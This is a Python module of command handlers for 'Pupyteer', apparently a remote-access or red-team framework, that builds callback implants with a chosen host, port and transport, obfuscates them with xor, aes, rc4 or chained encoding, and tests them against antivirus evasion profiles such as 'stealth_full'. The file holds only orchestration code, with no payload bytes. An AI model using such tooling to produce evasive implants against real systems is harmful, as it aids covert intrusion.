"""Pupyteer Pipeline Commands — unified payload-to-evasion pipeline.

Provides TUI and CLI commands for:
- pipeline run: Build + Obfuscate + Test
- pipeline build: Build only
- pipeline test: Test only
- pipeline auto: One-shot build + obfuscate + test
- pipeline status: Pipeline statistics
- pipeline history: Recent pipeline results
"""
from __future__ import annotations

import json
import sys
from typing import Any, Dict, List, Optional

from pupyteer.payloads.manager import (
    PayloadConfig,
    PayloadPlatform,
    PayloadArch,
    PayloadType,
)
from pupyteer.server.core.engine import PupyteerEngine
from pupyteer.server.evasion.models import EvasionTestConfig, TestEnvironment


def _get_engine() -> PupyteerEngine:
    """Get initialized engine with pipeline."""
    engine = PupyteerEngine()
    # Pipeline manager is now initialized as part of engine init
    return engine


async def _ensure_pipeline_initialized(engine: PupyteerEngine) -> None:
    """Ensure the pipeline manager is initialized."""
    # Pipeline is part of engine._pipeline, ensure it's initialized
    if not hasattr(engine, '_pipeline'):
        from pupyteer.server.core.pipeline import PipelineManager
        engine._pipeline = PipelineManager(engine)
    if not engine.pipeline._initialized:
        await engine.pipeline.initialize()


async def pipeline_run(args: List[str]) -> Dict[str, Any]:
    """Run full pipeline: Build → Obfuscate → Test.

    Usage: pipeline run --name NAME --platform PLATFORM --arch ARCH
                       [--type TYPE] [--transport TRANSPORT] [--host HOST] [--port PORT]
                       [--scheme xor|aes|rc4|chain] [--env ENVIRONMENT]
                       [--profile PROFILE] [--test-mode]
    """
    engine = _get_engine()

    # Parse arguments
    name = ""
    platform = PayloadPlatform.WINDOWS
    arch = PayloadArch.X64
    payload_type = PayloadType.EXECUTABLE
    transport = "tcp"
    host = "127.0.0.1"
    port = 8443
    profile = "HTTPS-Standard"
    scheme = "chain"
    environment = TestEnvironment.LOCAL.value
    test_mode = False
    evasion_name = ""

    i = 0
    while i < len(args):
        if args[i] == "--name" and i + 1 < len(args):
            name = args[i + 1]; i += 2
        elif args[i] == "--platform" and i + 1 < len(args):
            try:
                platform = PayloadPlatform(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid platform: {args[i + 1]}"}
            i += 2
        elif args[i] == "--arch" and i + 1 < len(args):
            try:
                arch = PayloadArch(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid arch: {args[i + 1]}"}
            i += 2
        elif args[i] == "--type" and i + 1 < len(args):
            try:
                payload_type = PayloadType(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid type: {args[i + 1]}"}
            i += 2
        elif args[i] == "--transport" and i + 1 < len(args):
            transport = args[i + 1]; i += 2
        elif args[i] == "--host" and i + 1 < len(args):
            host = args[i + 1]; i += 2
        elif args[i] == "--port" and i + 1 < len(args):
            try:
                port = int(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid port: {args[i + 1]}"}
            i += 2
        elif args[i] == "--profile" and i + 1 < len(args):
            profile = args[i + 1]; i += 2
        elif args[i] == "--scheme" and i + 1 < len(args):
            scheme = args[i + 1]; i += 2
        elif args[i] == "--env" and i + 1 < len(args):
            environment = args[i + 1]; i += 2
        elif args[i] == "--evasion-name" and i + 1 < len(args):
            evasion_name = args[i + 1]; i += 2
        elif args[i] == "--test-mode":
            test_mode = True; i += 1
        else:
            i += 1

    if not name:
        return {"status": "error", "error": "Missing required --name argument"}

    # Build payload config
    payload_config = PayloadConfig(
        name=name,
        platform=platform,
        arch=arch,
        payload_type=payload_type,
        transport=transport,
        host=host,
        port=port,
        profile=profile,
    )

    # Build obfuscation config
    from pupyteer.server.evasion.obfuscator import ObfuscationConfig, EncodingScheme
    try:
        scheme_enum = EncodingScheme(scheme)
    except ValueError:
        return {"status": "error", "error": f"Invalid scheme: {scheme}. Valid: xor, aes, rc4, chain"}

    obfuscation_config = ObfuscationConfig(scheme=scheme_enum)

    # Build evasion config
    evasion_config = EvasionTestConfig(
        name=evasion_name or name,
        environment=environment,
        test_mode=test_mode,
    )

    await _ensure_pipeline_initialized(engine)

    try:
        result = await engine.pipeline.build_obfuscate_test(
            payload_config,
            obfuscation_config,
            evasion_config,
        )
        return {"status": "ok", "result": result.to_dict()}
    except Exception as e:
        return {"status": "error", "error": str(e)}


async def pipeline_build(args: List[str]) -> Dict[str, Any]:
    """Build a payload only (no testing).

    Usage: pipeline build --name NAME --platform PLATFORM --arch ARCH
                         [--type TYPE] [--transport TRANSPORT] [--host HOST] [--port PORT]
                         [--profile PROFILE]
    """
    engine = PupyteerEngine()
    if not hasattr(engine, 'payloads'):
        return {"status": "error", "error": "Payload manager not initialized"}

    name = ""
    platform = PayloadPlatform.WINDOWS
    arch = PayloadArch.X64
    payload_type = PayloadType.EXECUTABLE
    transport = "tcp"
    host = "127.0.0.1"
    port = 8443
    profile = "HTTPS-Standard"
    version = ""
    expiration_days = 0
    sign = False

    i = 0
    while i < len(args):
        if args[i] == "--name" and i + 1 < len(args):
            name = args[i + 1]; i += 2
        elif args[i] == "--platform" and i + 1 < len(args):
            try:
                platform = PayloadPlatform(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid platform: {args[i + 1]}"}
            i += 2
        elif args[i] == "--arch" and i + 1 < len(args):
            try:
                arch = PayloadArch(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid arch: {args[i + 1]}"}
            i += 2
        elif args[i] == "--type" and i + 1 < len(args):
            try:
                payload_type = PayloadType(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid type: {args[i + 1]}"}
            i += 2
        elif args[i] == "--transport" and i + 1 < len(args):
            transport = args[i + 1]; i += 2
        elif args[i] == "--host" and i + 1 < len(args):
            host = args[i + 1]; i += 2
        elif args[i] == "--port" and i + 1 < len(args):
            try:
                port = int(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid port: {args[i + 1]}"}
            i += 2
        elif args[i] == "--profile" and i + 1 < len(args):
            profile = args[i + 1]; i += 2
        elif args[i] == "--version" and i + 1 < len(args):
            version = args[i + 1]; i += 2
        elif args[i] == "--expiration" and i + 1 < len(args):
            try:
                expiration_days = int(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid expiration: {args[i + 1]}"}
            i += 2
        elif args[i] == "--sign":
            sign = True; i += 1
        else:
            i += 1

    if not name:
        return {"status": "error", "error": "Missing required --name argument"}

    cfg = PayloadConfig(
        name=name,
        platform=platform,
        arch=arch,
        payload_type=payload_type,
        transport=transport,
        host=host,
        port=port,
        profile=profile,
    )

    try:
        metadata = await engine.payloads.build(
            cfg,
            version=version,
            expiration_days=expiration_days,
            sign=sign,
        )
        return {
            "status": "ok",
            "payload": {
                "payload_id": metadata.payload_id,
                "name": metadata.name,
                "version": metadata.version,
                "platform": metadata.platform,
                "arch": metadata.arch,
                "status": metadata.status,
                "hash_sha256": metadata.hash_sha256,
                "size_bytes": metadata.size_bytes,
                "build_timestamp": metadata.build_timestamp,
                "artifact_path": metadata.artifact_path,
                "expiration": metadata.expiration,
                "signed": metadata.signed,
            },
        }
    except ValueError as e:
        return {"status": "error", "error": str(e)}


async def pipeline_test(args: List[str]) -> Dict[str, Any]:
    """Test an existing artifact.

    Usage: pipeline test --artifact PATH [--env ENVIRONMENT] [--test-mode]
    """
    engine = _get_engine()
    await _ensure_pipeline_initialized(engine)

    artifact_path = ""
    environment = TestEnvironment.LOCAL.value
    test_mode = False

    i = 0
    while i < len(args):
        if args[i] == "--artifact" and i + 1 < len(args):
            artifact_path = args[i + 1]; i += 2
        elif args[i] == "--env" and i + 1 < len(args):
            environment = args[i + 1]; i += 2
        elif args[i] == "--test-mode":
            test_mode = True; i += 1
        else:
            i += 1

    if not artifact_path:
        return {"status": "error", "error": "Missing required --artifact argument"}

    from pupyteer.server.evasion.models import compute_file_hash

    artifact_hash = compute_file_hash(artifact_path)
    evasion_config = EvasionTestConfig(
        name=f"pipeline-test-{artifact_path}",
        artifact_path=artifact_path,
        artifact_hash_sha256=artifact_hash,
        environment=environment,
        test_mode=test_mode,
    )

    try:
        result = await engine.pipeline.test_only(artifact_path, evasion_config)
        return {"status": "ok", "result": result.to_dict()}
    except Exception as e:
        return {"status": "error", "error": str(e)}


async def pipeline_auto(args: List[str]) -> Dict[str, Any]:
    """One-shot: Build + Obfuscate + Test with named profile.

    Usage: pipeline auto --name NAME [--platform PLATFORM] [--arch ARCH]
                        [--type TYPE] [--transport TRANSPORT] [--host HOST] [--port PORT]
                        [--profile basic_xor|full_chain|pe_manipulation|anti_analysis|anti_injection|stealth_full]
                        [--env ENVIRONMENT]
    """
    engine = _get_engine()
    await _ensure_pipeline_initialized(engine)

    name = ""
    platform = "windows"
    arch = "x64"
    payload_type = "executable"
    transport = "tcp"
    host = "127.0.0.1"
    port = 8443
    profile_name = "full_chain"
    environment = TestEnvironment.LOCAL.value

    i = 0
    while i < len(args):
        if args[i] == "--name" and i + 1 < len(args):
            name = args[i + 1]; i += 2
        elif args[i] == "--platform" and i + 1 < len(args):
            platform = args[i + 1]; i += 2
        elif args[i] == "--arch" and i + 1 < len(args):
            arch = args[i + 1]; i += 2
        elif args[i] == "--type" and i + 1 < len(args):
            payload_type = args[i + 1]; i += 2
        elif args[i] == "--transport" and i + 1 < len(args):
            transport = args[i + 1]; i += 2
        elif args[i] == "--host" and i + 1 < len(args):
            host = args[i + 1]; i += 2
        elif args[i] == "--port" and i + 1 < len(args):
            try:
                port = int(args[i + 1])
            except ValueError:
                return {"status": "error", "error": f"Invalid port: {args[i + 1]}"}
            i += 2
        elif args[i] == "--profile" and i + 1 < len(args):
            profile_name = args[i + 1]; i += 2
        elif args[i] == "--env" and i + 1 < len(args):
            environment = args[i + 1]; i += 2
        else:
            i += 1

    if not name:
        return {"status": "error", "error": "Missing required --name argument"}

    try:
        result = await engine.pipeline.auto(
            name=name,
            platform=platform,
            arch=arch,
            payload_type=payload_type,
            transport=transport,
            host=host,
            port=port,
            profile_name=profile_name,
            environment=environment,
        )
        return {"status": "ok", "result": result.to_dict()}
    except Exception as e:
        return {"status": "error", "error": str(e)}


async def pipeline_status(args: List[str]) -> Dict[str, Any]:
    """Show pipeline statistics and status."""
    engine = _get_engine()
    await _ensure_pipeline_initialized(engine)

    stats = engine.pipeline.get_stats()
    return {"status": "ok", "stats": stats}


async def pipeline_history(args: List[str]) -> Dict[str, Any]:
    """Show recent pipeline results.

    Usage: pipeline history [--limit N]
    """
    engine = _get_engine()
    await _ensure_pipeline_initialized(engine)

    limit = 10
    if args and args[0] == "--limit" and len(args) > 1:
        try:
            limit = int(args[1])
        except ValueError:
            return {"status": "error", "error": f"Invalid limit: {args[1]}"}

    history = engine.pipeline.get_history(limit=limit)
    results = [r.to_dict() for r in history]
    return {"status": "ok", "count": len(results), "history": results}


async def pipeline_profiles(args: List[str]) -> Dict[str, Any]:
    """List available obfuscation profiles."""
    from pupyteer.server.evasion.profiles import list_profiles

    profiles = list_profiles()
    return {"status": "ok", "count": len(profiles), "profiles": profiles}


async def pipeline_info(args: List[str]) -> Dict[str, Any]:
    """Get detailed info about a pipeline run.

    Usage: pipeline info PIPELINE_ID
    """
    engine = _get_engine()
    await _ensure_pipeline_initialized(engine)

    if not args:
        return {"status": "error", "error": "Missing pipeline_id argument"}

    pipeline_id = args[0]
    for r in engine.pipeline.history:
        if r.pipeline_id == pipeline_id:
            return {"status": "ok", "result": r.to_dict()}

    return {"status": "error", "error": f"Pipeline run not found: {pipeline_id}"}


COMMANDS = {
    "pipeline_run": pipeline_run,
    "pipeline_build": pipeline_build,
    "pipeline_test": pipeline_test,
    "pipeline_auto": pipeline_auto,
    "pipeline_status": pipeline_status,
    "pipeline_history": pipeline_history,
    "pipeline_profiles": pipeline_profiles,
    "pipeline_info": pipeline_info,
}
